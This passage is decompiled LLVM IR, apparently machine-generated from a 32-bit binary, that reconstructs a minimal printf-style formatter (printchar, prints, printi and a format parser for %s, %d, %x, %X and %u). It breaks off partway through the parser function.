define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80483fd = icmp eq i32* %arg1, null
  br i1 %v4_80483fd, label %dec_label_pc_804841c, label %dec_label_pc_8048403

dec_label_pc_8048403:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_8048406 = load i32, i32* %arg1, align 4
  %v3_804840b = inttoptr i32 %v2_8048406 to i8*
  store i8 %tmp8, i8* %v3_804840b, align 1
  %v2_8048410 = load i32, i32* %arg1, align 4
  %v1_8048412 = add i32 %v2_8048410, 1
  store i32 %v1_8048412, i32* %arg1, align 4
  br label %dec_label_pc_8048437

dec_label_pc_804841c:                             ; preds = %entry
  %v3_8048432 = bitcast i8* %stack_var_8 to i32*
  %v4_8048432 = call i32 @__libc_write(i32 1, i32* %v3_8048432, i32 1)
  br label %dec_label_pc_8048437

dec_label_pc_8048437:                             ; preds = %dec_label_pc_8048403, %dec_label_pc_804841c
  %v0_8048438 = phi i32 [ %tmp5, %dec_label_pc_8048403 ], [ %v4_8048432, %dec_label_pc_804841c ]
  ret i32 %v0_8048438

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048437, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_804849a, label %dec_label_pc_8048453

dec_label_pc_8048453:                             ; preds = %entry
  %v4_804845a = ptrtoint i8* %arg2 to i32
  %v2_804846b45 = load i8, i8* %arg2, align 1
  %v4_804846e47 = icmp eq i8 %v2_804846b45, 0
  %v1_804847049 = icmp eq i1 %v4_804846e47, false
  br i1 %v1_804847049, label %dec_label_pc_8048462, label %dec_label_pc_8048472

dec_label_pc_8048462:                             ; preds = %dec_label_pc_8048453, %dec_label_pc_8048462
  %v4_804846851 = phi i32 [ %v5_8048465, %dec_label_pc_8048462 ], [ %v4_804845a, %dec_label_pc_8048453 ]
  %stack_var_-12.050 = phi i32 [ %v4_8048462, %dec_label_pc_8048462 ], [ 0, %dec_label_pc_8048453 ]
  %v4_8048462 = add i32 %stack_var_-12.050, 1
  %v5_8048465 = add i32 %v4_804846851, 1
  %v22_8048465 = inttoptr i32 %v5_8048465 to i8*
  %v2_804846b = load i8, i8* %v22_8048465, align 1
  %v4_804846e = icmp eq i8 %v2_804846b, 0
  %v1_8048470 = icmp eq i1 %v4_804846e, false
  br i1 %v1_8048470, label %dec_label_pc_8048462, label %dec_label_pc_8048472

dec_label_pc_8048472:                             ; preds = %dec_label_pc_8048462, %dec_label_pc_8048453
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048453 ], [ %v4_8048462, %dec_label_pc_8048462 ]
  %v5_8048478 = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_8048478, label %dec_label_pc_8048483, label %dec_label_pc_8048489

dec_label_pc_8048483:                             ; preds = %dec_label_pc_8048472
  %v5_8048486 = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048489

dec_label_pc_8048489:                             ; preds = %dec_label_pc_8048472, %dec_label_pc_8048483
  %storemerge = phi i32 [ %v5_8048486, %dec_label_pc_8048483 ], [ 0, %dec_label_pc_8048472 ]
  %v1_804848c = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_804848c, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_804849a

dec_label_pc_804849a:                             ; preds = %dec_label_pc_8048489, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_8048489 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_8048489 ]
  %v1_804849d = urem i32 %arg4, 2
  %v2_804849d = icmp eq i32 %v1_804849d, 0
  %v1_80484a2 = icmp eq i1 %v2_804849d, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_80484a2, label %dec_label_pc_80484e4.preheader, label %dec_label_pc_80484be.preheader

dec_label_pc_80484be.preheader:                   ; preds = %dec_label_pc_804849a
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_80484a6, label %dec_label_pc_80484e4.preheader

dec_label_pc_80484a6:                             ; preds = %dec_label_pc_80484be.preheader, %dec_label_pc_80484a6
  %stack_var_-20.041 = phi i32 [ %v4_80484b8, %dec_label_pc_80484a6 ], [ 0, %dec_label_pc_80484be.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_80484bb, %dec_label_pc_80484a6 ], [ %stack_var_12.0, %dec_label_pc_80484be.preheader ]
  %v3_80484b3 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_80484b8 = add i32 %stack_var_-20.041, 1
  %v4_80484bb = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_80484bb, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_80484a6, label %dec_label_pc_80484e4.preheader

dec_label_pc_80484e4.preheader:                   ; preds = %dec_label_pc_80484be.preheader, %dec_label_pc_80484a6, %dec_label_pc_804849a
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804849a ], [ %stack_var_12.0, %dec_label_pc_80484be.preheader ], [ %v4_80484bb, %dec_label_pc_80484a6 ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804849a ], [ 0, %dec_label_pc_80484be.preheader ], [ %v4_80484b8, %dec_label_pc_80484a6 ]
  %v4_80484e426 = ptrtoint i8* %arg2 to i32
  %v2_80484e727 = load i8, i8* %arg2, align 1
  %v4_80484ea29 = icmp eq i8 %v2_80484e727, 0
  %v1_80484ec31 = icmp eq i1 %v4_80484ea29, false
  br i1 %v1_80484ec31, label %dec_label_pc_80484c6, label %dec_label_pc_8048508.preheader

dec_label_pc_80484c6:                             ; preds = %dec_label_pc_80484e4.preheader, %dec_label_pc_80484c6
  %v4_80484e434 = phi i32 [ %v5_80484e1, %dec_label_pc_80484c6 ], [ %v4_80484e426, %dec_label_pc_80484e4.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_80484de, %dec_label_pc_80484c6 ], [ %stack_var_-20.1.ph, %dec_label_pc_80484e4.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_80484e1, %dec_label_pc_80484c6 ], [ %arg2, %dec_label_pc_80484e4.preheader ]
  %v2_80484c9 = load i8, i8* %stack_var_8.032, align 1
  %v3_80484c9 = zext i8 %v2_80484c9 to i32
  %v3_80484d9 = call i32 @printchar(i32* %.pre, i32 %v3_80484c9)
  %v4_80484de = add i32 %stack_var_-20.133, 1
  %v5_80484e1 = add i32 %v4_80484e434, 1
  %v22_80484e1 = inttoptr i32 %v5_80484e1 to i8*
  %v2_80484e7 = load i8, i8* %v22_80484e1, align 1
  %v4_80484ea = icmp eq i8 %v2_80484e7, 0
  %v1_80484ec = icmp eq i1 %v4_80484ea, false
  br i1 %v1_80484ec, label %dec_label_pc_80484c6, label %dec_label_pc_8048508.preheader

dec_label_pc_8048508.preheader:                   ; preds = %dec_label_pc_80484c6, %dec_label_pc_80484e4.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484e4.preheader ], [ %v4_80484de, %dec_label_pc_80484c6 ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_80484f0, label %dec_label_pc_804850e

dec_label_pc_80484f0:                             ; preds = %dec_label_pc_8048508.preheader, %dec_label_pc_80484f0
  %stack_var_-20.225 = phi i32 [ %v4_8048502, %dec_label_pc_80484f0 ], [ %stack_var_-20.1.lcssa, %dec_label_pc_8048508.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_8048505, %dec_label_pc_80484f0 ], [ %stack_var_12.2.ph, %dec_label_pc_8048508.preheader ]
  %v3_80484fd = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_8048502 = add i32 %stack_var_-20.225, 1
  %v4_8048505 = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_8048505, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_80484f0, label %dec_label_pc_804850e

dec_label_pc_804850e:                             ; preds = %dec_label_pc_80484f0, %dec_label_pc_8048508.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_8048508.preheader ], [ %v4_8048502, %dec_label_pc_80484f0 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048505, { 1, 0 }
  uselistorder i8* %v22_80484e1, { 1, 0 }
  uselistorder i32 %v5_80484e1, { 1, 0 }
  uselistorder i32 %v4_80484bb, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %v5_8048465, { 1, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_80484f0, { 1, 0 }
  uselistorder label %dec_label_pc_80484c6, { 1, 0 }
  uselistorder label %dec_label_pc_80484e4.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80484a6, { 1, 0 }
  uselistorder label %dec_label_pc_8048489, { 1, 0 }
  uselistorder label %dec_label_pc_8048462, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_8048527 = trunc i64 %arg2 to i32
  %v5_804852d = icmp eq i32 %v4_8048527, 0
  %v6_804852d = icmp slt i32 %v4_8048527, 0
  %v1_8048531 = icmp eq i1 %v5_804852d, false
  br i1 %v1_8048531, label %dec_label_pc_8048563, label %dec_label_pc_8048533

dec_label_pc_8048533:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp41 = bitcast i32* %stack_var_-16 to i8*
  %v6_8048556 = call i32 @prints(i32 %arg1, i8* %tmp41, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_804864d

dec_label_pc_8048563:                             ; preds = %entry
  %v4_8048563 = icmp eq i32 %arg4, 0
  br i1 %v4_8048563, label %dec_label_pc_8048584, label %dec_label_pc_8048569

dec_label_pc_8048569:                             ; preds = %dec_label_pc_8048563
  %v13_8048569 = icmp eq i32 %arg3, 10
  %v1_804856d = icmp eq i1 %v13_8048569, false
  br i1 %v1_804856d, label %dec_label_pc_8048584, label %dec_label_pc_804856f

dec_label_pc_804856f:                             ; preds = %dec_label_pc_8048569
  %v1_8048573 = icmp eq i1 %v6_804852d, false
  br i1 %v1_8048573, label %dec_label_pc_8048584, label %dec_label_pc_8048575

dec_label_pc_8048575:                             ; preds = %dec_label_pc_804856f
  %v1_804857f = sub i32 0, %v4_8048527
  %v5_8048581 = sext i32 %v1_804857f to i64
  br label %dec_label_pc_8048584

dec_label_pc_8048584:                             ; preds = %dec_label_pc_804856f, %dec_label_pc_8048569, %dec_label_pc_8048563, %dec_label_pc_8048575
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_8048563 ], [ %arg2, %dec_label_pc_8048569 ], [ %arg2, %dec_label_pc_804856f ], [ %v5_8048581, %dec_label_pc_8048575 ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048563 ], [ 0, %dec_label_pc_8048569 ], [ 0, %dec_label_pc_804856f ], [ 1, %dec_label_pc_8048575 ]
  %tmp42 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp42, align 4
  %v4_80485e57 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485e58 = icmp eq i32 %v4_80485e57, 0
  %v1_80485e915 = icmp eq i1 %v5_80485e58, false
  br i1 %v1_80485e915, label %dec_label_pc_8048595.lr.ph, label %dec_label_pc_80485eb

dec_label_pc_8048595.lr.ph:                       ; preds = %dec_label_pc_8048584
  %v5_8048598 = sext i32 %arg3 to i64
  br label %dec_label_pc_8048595

dec_label_pc_8048595:                             ; preds = %dec_label_pc_8048595.lr.ph, %dec_label_pc_80485bd
  %stack_var_-24.117 = phi i64 [ %stack_var_-24.0, %dec_label_pc_8048595.lr.ph ], [ %v5_80485e2, %dec_label_pc_80485bd ]
  %stack_var_-40.016 = phi i8* [ %tmp42, %dec_label_pc_8048595.lr.ph ], [ %v22_80485bd, %dec_label_pc_80485bd ]
  %v6_80485a3 = and i64 %stack_var_-24.117, 4294967295
  %v12_80485a3 = udiv i64 %v6_80485a3, %v5_8048598
  %v13_80485a3 = trunc i64 %v12_80485a3 to i32
  %v14_80485a3 = urem i64 %v6_80485a3, %v5_8048598
  %v5_80485a8 = trunc i64 %v14_80485a3 to i8
  %v7_80485af = icmp sgt i8 %v5_80485a8, 9
  br i1 %v7_80485af, label %dec_label_pc_80485b1, label %dec_label_pc_80485bd

dec_label_pc_80485b1:                             ; preds = %dec_label_pc_8048595
  %tmp = trunc i64 %v14_80485a3 to i32
  %v5_80485b4 = add i32 %tmp, %arg7
  %v1_80485b7 = add i32 %v5_80485b4, 198
  %v11_80485b7 = trunc i32 %v1_80485b7 to i8
  br label %dec_label_pc_80485bd

dec_label_pc_80485bd:                             ; preds = %dec_label_pc_8048595, %dec_label_pc_80485b1
  %stack_var_-36.0 = phi i8 [ %v11_80485b7, %dec_label_pc_80485b1 ], [ %v5_80485a8, %dec_label_pc_8048595 ]
  %v4_80485bd = ptrtoint i8* %stack_var_-40.016 to i32
  %v5_80485bd = add i32 %v4_80485bd, -1
  %v22_80485bd = inttoptr i32 %v5_80485bd to i8*
  %v2_80485c4 = add i8 %stack_var_-36.0, 48
  store i8 %v2_80485c4, i8* %v22_80485bd, align 1
  %v5_80485e2 = sext i32 %v13_80485a3 to i64
  %v5_80485e5 = icmp eq i32 %v13_80485a3, 0
  %v1_80485e9 = icmp eq i1 %v5_80485e5, false
  br i1 %v1_80485e9, label %dec_label_pc_8048595, label %dec_label_pc_80485eb

dec_label_pc_80485eb:                             ; preds = %dec_label_pc_80485bd, %dec_label_pc_8048584
  %stack_var_-40.0.lcssa = phi i8* [ %tmp42, %dec_label_pc_8048584 ], [ %v22_80485bd, %dec_label_pc_80485bd ]
  %v4_80485eb = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485eb, label %dec_label_pc_8048625, label %dec_label_pc_80485f1

dec_label_pc_80485f1:                             ; preds = %dec_label_pc_80485eb
  %v4_80485f1 = icmp eq i32 %arg5, 0
  br i1 %v4_80485f1, label %dec_label_pc_804861c, label %dec_label_pc_80485f7

dec_label_pc_80485f7:                             ; preds = %dec_label_pc_80485f1
  %v1_80485fa = and i32 %arg6, 2
  %v2_80485fa = icmp eq i32 %v1_80485fa, 0
  br i1 %v2_80485fa, label %dec_label_pc_804861c, label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485f7
  %v3_804860f = inttoptr i32 %arg1 to i32*
  %v4_804860f = call i32 @printchar(i32* %v3_804860f, i32 45)
  %v4_8048617 = add i32 %arg5, -1
  br label %dec_label_pc_8048625

dec_label_pc_804861c:                             ; preds = %dec_label_pc_80485f7, %dec_label_pc_80485f1
  %v4_804861c = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_804861c = add i32 %v4_804861c, -1
  %v22_804861c = inttoptr i32 %v5_804861c to i8*
  store i8 45, i8* %v22_804861c, align 1
  br label %dec_label_pc_8048625

dec_label_pc_8048625:                             ; preds = %dec_label_pc_80485eb, %dec_label_pc_8048601, %dec_label_pc_804861c
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_80485eb ], [ %arg5, %dec_label_pc_804861c ], [ %v4_8048617, %dec_label_pc_8048601 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_80485eb ], [ %v22_804861c, %dec_label_pc_804861c ], [ %stack_var_-40.0.lcssa, %dec_label_pc_8048601 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485eb ], [ 0, %dec_label_pc_804861c ], [ 1, %dec_label_pc_8048601 ]
  %v6_8048640 = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_8048648 = add i32 %v6_8048640, %stack_var_-28.0
  br label %dec_label_pc_804864d

dec_label_pc_804864d:                             ; preds = %dec_label_pc_8048533, %dec_label_pc_8048625
  %storemerge = phi i32 [ %v2_8048648, %dec_label_pc_8048625 ], [ %v6_8048556, %dec_label_pc_8048533 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_80485bd, { 0, 2, 1 }
  uselistorder i8 %v5_80485a8, { 1, 0 }
  uselistorder i64 %v6_80485a3, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804864d, { 1, 0 }
  uselistorder label %dec_label_pc_8048625, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485bd, { 1, 0 }
  uselistorder label %dec_label_pc_8048595, { 1, 0 }
  uselistorder label %dec_label_pc_8048584, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.449 = inttoptr i32 %arg2 to i8*
  %v2_804890650 = load i8, i8* %stack_var_8.449, align 1
  %v4_804890952 = icmp eq i8 %v2_804890650, 0
  %v1_804890b54 = icmp eq i1 %v4_804890952, false
  br i1 %v1_804890b54, label %dec_label_pc_8048664, label %dec_label_pc_8048911

dec_label_pc_8048664:                             ; preds = %entry, %dec_label_pc_8048900
  %stack_var_8.458 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048900 ], [ %stack_var_8.449, %entry ]
  %stack_var_-28.157 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048900 ], [ 0, %entry ]
  %stack_var_12.156 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048900 ], [ %arg3, %entry ]
  %stack_var_8.4.in55 = phi i32 [ %v5_8048900, %dec_label_pc_8048900 ], [ %arg2, %entry ]
  %v2_8048667 = load i8, i8* %stack_var_8.458, align 1
  %v10_804866a = icmp eq i8 %v2_8048667, 37
  %v1_804866c = icmp eq i1 %v10_804866a, false
  br i1 %v1_804866c, label %dec_label_pc_80488e5, label %dec_label_pc_8048672

dec_label_pc_8048672:                             ; preds = %dec_label_pc_8048664
  %v5_8048672 = add i32 %stack_var_8.4.in55, 1
  %v22_8048672 = inttoptr i32 %v5_8048672 to i8*
  %v2_8048685 = load i8, i8* %v22_8048672, align 1
  %v4_8048688 = icmp eq i8 %v2_8048685, 0
  br i1 %v4_8048688, label %dec_label_pc_8048911, label %dec_label_pc_8048690

dec_label_pc_8048690:                             ; preds = %dec_label_pc_8048672
  %v2_8048693 = load i8, i8* %v22_8048672, align 1
  %v10_8048696 = icmp eq i8 %v2_8048693, 37
  br i1 %v10_8048696, label %dec_label_pc_80488e5, label %dec_label_pc_804869e

dec_label_pc_804869e:                             ; preds = %dec_label_pc_8048690
  %v2_80486a1 = load i8, i8* %v22_8048672, align 1
  %v10_80486a4 = icmp eq i8 %v2_80486a1, 45
  %v1_80486a6 = icmp eq i1 %v10_80486a4, false
  br i1 %v1_80486a6, label %dec_label_pc_80486bb.preheader, label %dec_label_pc_80486a8

dec_label_pc_80486a8:                             ; preds = %dec_label_pc_804869e
  %v5_80486a8 = add i32 %stack_var_8.4.in55, 2
  %v22_80486a8 = inttoptr i32 %v5_80486a8 to i8*
  br label %dec_label_pc_80486bb.preheader

dec_label_pc_80486bb.preheader:                   ; preds = %dec_label_pc_80486a8, %dec_label_pc_804869e
  %stack_var_8.0.ph = phi i8* [ %v22_8048672, %dec_label_pc_804869e ], [ %v22_80486a8, %dec_label_pc_80486a8 ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_804869e ], [ 1, %dec_label_pc_80486a8 ]
  %v4_80486bb22 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_80486be23 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_80486c127 = icmp eq i8 %v2_80486be23, 48
  br i1 %v7_80486c127, label %dec_label_pc_80486b4, label %dec_label_pc_80486ea.preheader

dec_label_pc_80486b4:                             ; preds = %dec_label_pc_80486bb.preheader, %dec_label_pc_80486b4
  %v4_80486bb30 = phi i32 [ %v5_80486b4, %dec_label_pc_80486b4 ], [ %v4_80486bb22, %dec_label_pc_80486bb.preheader ]
  %stack_var_-32.029 = phi i32 [ %v4_80486b7, %dec_label_pc_80486b4 ], [ %stack_var_-32.0.ph, %dec_label_pc_80486bb.preheader ]
  %v5_80486b4 = add i32 %v4_80486bb30, 1
  %v22_80486b4 = inttoptr i32 %v5_80486b4 to i8*
  %v4_80486b7 = or i32 %stack_var_-32.029, 2
  %v2_80486be = load i8, i8* %v22_80486b4, align 1
  %v7_80486c1 = icmp eq i8 %v2_80486be, 48
  br i1 %v7_80486c1, label %dec_label_pc_80486b4, label %dec_label_pc_80486ea.preheader

dec_label_pc_80486ea.preheader:                   ; preds = %dec_label_pc_80486b4, %dec_label_pc_80486bb.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80486bb.preheader ], [ %v22_80486b4, %dec_label_pc_80486b4 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80486bb.preheader ], [ %v4_80486b7, %dec_label_pc_80486b4 ]
  %v4_80486ea32 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  %v2_80486ed33 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %tmp = icmp ult i8 %v2_80486ed33, 48
  br i1 %tmp, label %dec_label_pc_80486fe, label %dec_label_pc_80486f4

dec_label_pc_80486c7:                             ; preds = %dec_label_pc_80486f4
  %v2_80486d0 = mul i32 %stack_var_-36.041, 10
  %v2_80486d8 = load i8, i8* %stack_var_8.140, align 1
  %v3_80486d8 = zext i8 %v2_80486d8 to i32
  %v5_80486de = add i32 %v3_80486d8, %v2_80486d0
  %v1_80486e1 = add i32 %v5_80486de, -48
  %v5_80486e7 = add i32 %v4_80486ea42, 1
  %v22_80486e7 = inttoptr i32 %v5_80486e7 to i8*
  %v2_80486ed = load i8, i8* %v22_80486e7, align 1
  %tmp65 = icmp ult i8 %v2_80486ed, 48
  br i1 %tmp65, label %dec_label_pc_80486fe, label %dec_label_pc_80486f4

dec_label_pc_80486f4:                             ; preds = %dec_label_pc_80486ea.preheader, %dec_label_pc_80486c7
  %v4_80486ea42 = phi i32 [ %v5_80486e7, %dec_label_pc_80486c7 ], [ %v4_80486ea32, %dec_label_pc_80486ea.preheader ]
  %stack_var_-36.041 = phi i32 [ %v1_80486e1, %dec_label_pc_80486c7 ], [ 0, %dec_label_pc_80486ea.preheader ]
  %stack_var_8.140 = phi i8* [ %v22_80486e7, %dec_label_pc_80486c7 ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486ea.preheader ]
  %v2_80486f7 = load i8, i8* %stack_var_8.140, align 1
  %tmp66 = icmp ult i8 %v2_80486f7, 58
  br i1 %tmp66, label %dec_label_pc_80486c7, label %dec_label_pc_80486fe

dec_label_pc_80486fe:                             ; preds = %dec_label_pc_80486c7, %dec_label_pc_80486f4, %dec_label_pc_80486ea.preheader
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486ea.preheader ], [ %stack_var_8.140, %dec_label_pc_80486f4 ], [ %v22_80486e7, %dec_label_pc_80486c7 ]
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486ea.preheader ], [ %stack_var_-36.041, %dec_label_pc_80486f4 ], [ %v1_80486e1, %dec_label_pc_80486c7 ]
  %v2_8048701 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048704 = icmp eq i8 %v2_8048701, 115
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048755, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486fe
  %v1_804870b = add i32 %stack_var_12.156, 4
  %v1_8048713 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  %v4_8048718 = icmp eq i32 %v2_8048713, 0
  br i1 %v4_8048718, label %dec_label_pc_804872d, label %dec_label_pc_804871e

dec_label_pc_804871e:                             ; preds = %dec_label_pc_8048708
  %v5_8048721 = inttoptr i32 %v2_8048713 to i8*
  br label %dec_label_pc_804872d

dec_label_pc_804872d:                             ; preds = %dec_label_pc_8048708, %dec_label_pc_804871e
  %storemerge = phi i8* [ %v5_8048721, %dec_label_pc_804871e ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_804ff55.12, i32 0, i32 0), %dec_label_pc_8048708 ]
  %v6_8048748 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_804874d = add i32 %v6_8048748, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_8048755:                             ; preds = %dec_label_pc_80486fe
  %v2_8048758 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_804875b = icmp eq i8 %v2_8048758, 100
  %v1_804875d = icmp eq i1 %v10_804875b, false
  br i1 %v1_804875d, label %dec_label_pc_80487a9, label %dec_label_pc_804875f

dec_label_pc_804875f:                             ; preds = %dec_label_pc_8048755
  %v1_8048762 = add i32 %stack_var_12.156, 4
  %v1_804876a = inttoptr i32 %stack_var_12.156 to i32*
  %v2_804876a = load i32, i32* %v1_804876a, align 4
  %v8_804879c = sext i32 %v2_804876a to i64
  %v9_804879c = call i32 @printi(i32 %tmp6, i64 %v8_804879c, i32 10, i32 1, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80487a1 = add i32 %v9_804879c, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_80487a9:                             ; preds = %dec_label_pc_8048755
  %v2_80487ac = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80487af = icmp eq i8 %v2_80487ac, 120
  %v1_80487b1 = icmp eq i1 %v10_80487af, false
  br i1 %v1_80487b1, label %dec_label_pc_80487fd, label %dec_label_pc_80487b3

dec_label_pc_80487b3:                             ; preds = %dec_label_pc_80487a9
  %v1_80487b6 = add i32 %stack_var_12.156, 4
  %v1_80487be = inttoptr i32 %stack_var_12.156 to i32*
  %v2_80487be = load i32, i32* %v1_80487be, align 4
  %v8_80487f0 = sext i32 %v2_80487be to i64
  %v9_80487f0 = call i32 @printi(i32 %tmp6, i64 %v8_80487f0, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80487f5 = add i32 %v9_80487f0, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_80487fd:                             ; preds = %dec_label_pc_80487a9
  %v2_8048800 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048803 = icmp eq i8 %v2_8048800, 88
  %v1_8048805 = icmp eq i1 %v10_8048803, false
  br i1 %v1_8048805, label %dec_label_pc_8048851, label %dec_label_pc_8048807

dec_label_pc_8048807:                             ; preds = %dec_label_pc_80487fd
  %v1_804880a = add i32 %stack_var_12.156, 4
  %v1_8048812 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  %v8_8048844 = sext i32 %v2_8048812 to i64
  %v9_8048844 = call i32 @printi(i32 %tmp6, i64 %v8_8048844, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_8048849 = add i32 %v9_8048844, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_8048851:                             ; preds = %dec_label_pc_80487fd
  %v2_8048854 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048857 = icmp eq i8 %v2_8048854, 117
  %v1_8048859 = icmp eq i1 %v10_8048857, false
  br i1 %v1_8048859, label %dec_label_pc_80488a2, label %dec_label_pc_804885b

dec_label_pc_804885b:                             ; preds = %dec_label_pc_8048851
  %v1_804885e = add i32 %stack_var_12.156, 4
  %v1_8048866 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_8048866 = load i32, i32* %v1_8048866, align 4
  %v8_8048898 = sext i32 %v2_8048866 to i64
  %v9_8048898 = call i32 @printi(i32 %tmp6, i64 %v8_8048898, i32 10, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804889d = add i32 %v9_8048898, %stack_var_-28.157
  br label %dec_label_pc_8048900

dec_label_pc_80488a2:                             ; preds = %dec_label_pc_8048851
